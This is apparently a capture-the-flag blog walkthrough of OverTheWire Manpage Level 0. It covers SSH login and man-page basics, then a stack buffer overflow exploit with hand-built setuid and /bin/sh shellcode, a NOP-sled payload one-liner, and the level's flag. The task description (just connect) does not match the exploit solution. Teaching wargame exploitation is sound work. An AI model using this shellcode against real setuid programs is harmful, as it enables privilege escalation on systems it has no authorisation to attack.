---
layout: post-with-comments
title: "OverTheWire Manpage Level 0 tutorial!!"
permalink: /posts/overTheWire-Manpage-Level-0/
tags: [overthewire, manpage, walkthrough, ctf, linux, beginner]
description: "A step by step tutorial for OverTheWire Manpage Level 0!!"
---

<!-- Scoped styles: only affect this post -->

<style>
  .manpage-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .manpage-nav .nav-left,.manpage-nav .nav-center,.manpage-nav .nav-right{flex:1}
  .manpage-nav .nav-left{text-align:left}
  .manpage-nav .nav-center{text-align:center}
  .manpage-nav .nav-right{text-align:right}
  .manpage-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .manpage-nav a:hover{transform:translateY(-1px)}
  .manpage-nav .disabled{opacity:.55}
  :root[data-theme='light'] .manpage-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="manpage-nav" aria-label="Manpage level navigation">
  <div class="nav-left">
    <span class="disabled">Previous: —</span>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/manpage/manpage0.html" target="_blank" rel="noopener">
      Official Level 0 ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Manpage-Level-0-to-1/' | relative_url }}">
      Next: Level 0 → 1 →
    </a>
  </div>
</nav>

## Login

Use the following SSH command to connect to the Manpage server.

```bash
ssh manpage0@manpage.labs.overthewire.org -p 2224
# password: manpage0
```

## Task

Log into the **Manpage** server via SSH and confirm you are inside the `manpage0` environment. After login, list `/manpage/` to see the game materials you will use in later levels.

The goal for this first level is simply to **connect successfully** and get comfortable with the `man` (manual pages) tool you will rely on later.

## A little bit of Theory

* **SSH (Secure Shell)** provides encrypted remote access.
* Basic syntax:

  ```bash
  ssh <username>@<server> -p <port>
  ```

  Here, the username is `manpage0`, the host is `manpage.labs.overthewire.org`, and the non‑default port is `2224`.
* On first connection, SSH will ask you to trust the host key; answering `yes` stores it in `~/.ssh/known_hosts`.
* After successful login you land in the user’s **home directory** (`~`).
* **Man pages** are built‑in docs for Unix/Linux tools and APIs:

  * `man <command>` opens a manual.
  * `man <section> <name>` targets a specific section (e.g., `man 5 crontab`).
  * Search inside a man page with `/keyword`, then `n`/`N`.
  * `man -k <keyword>` / `apropos <keyword>` searches by description.
  * Handy references: `man 7 man-pages`, `man 7 regex`.

## Solution

**Vulnerable program (given):**

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[]){
    char buf[256];
    setuid( getuid() );
    strcpy(buf, argv[1]);
    return 0;
}
```

We can easily get code execution by placing shellcode into `buf` (copied by `strcpy`) and returning to it. However, `setuid(getuid())` drops the program’s elevated privileges (effective UID), so we first need to **restore** the target UID before spawning a shell.

**Privilege-restore stub (i386):**

```asm
section .text
    global _start

_start:
    xor ebx, ebx
    xor eax, eax
    mov al, 0x17        ; sys_setuid
    mov bx, 0x4269      ; 0x4269 == 17001 (uid of manpage1)
    int 0x80
```

The code above triggers syscall **23** (`setuid`) with argument **17001**, which corresponds to the `manpage1` user ID.

**Build and extract shellcode:**

```bash
nasm -f elf setuid.asm
ld -m elf_i386 -s -o setuid setuid.o
objdump -M intel -d setuid
# shellcode: \x31\xdb\x31\xc0\xb0\x17\x66\xbb\x69\x42\xcd\x80
```

From analysis we need **260 bytes** of padding to reach/control EIP. The final payload layout is:

* NOP sled (100 bytes)
* `setuid(17001)` shellcode
* `/bin/sh` shellcode
* Padding (120 × `A`)
* Return address → into the sled

**Exploit invocation:**

```bash
/manpage/manpage0 $(python3 -c 'import sys,struct;
payload  = b"\x90"*100
payload += b"\x31\xdb\x31\xc0\xb0\x17\x66\xbb\x69\x42\xcd\x80"
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
payload += b"\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload += b"A"*120
payload += struct.pack("<I", 0xffffd4d8)  # example return address, adjust via gdb
sys.stdout.buffer.write(payload)')
```

This yielded a shell and the flag `deesohwuno`.

### Why this works

* `setuid(getuid())` removes prior privilege; our injected stub **re-acquires** the intended UID (`17001`) via syscall `setuid(17001)`.
* Control over EIP at offset **260** lets us redirect execution into the NOP sled placed in `buf`.
* After privileges are restored, the classic `/bin/sh` shellcode successfully spawns a shell with the required permissions.
* The chosen return address points back into the sled, increasing reliability.

## Troubleshooting quick tips

* `ssh: connect to host ... port 2224: Connection timed out` → Check connectivity/firewall; ensure `-p 2224` is present.
* `Permission denied` → Re‑check username/password (`manpage0`/`manpage0`).
* `Host key verification failed` → Remove the stale key from `~/.ssh/known_hosts` and retry.

---

**Congrats 🎉** You’ve successfully completed **Level 0** and are ready for **Level 0 → 1**, where you’ll start using `man` intentionally to hunt for answers.

---

## Thanks for reading!

See you in the next level — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
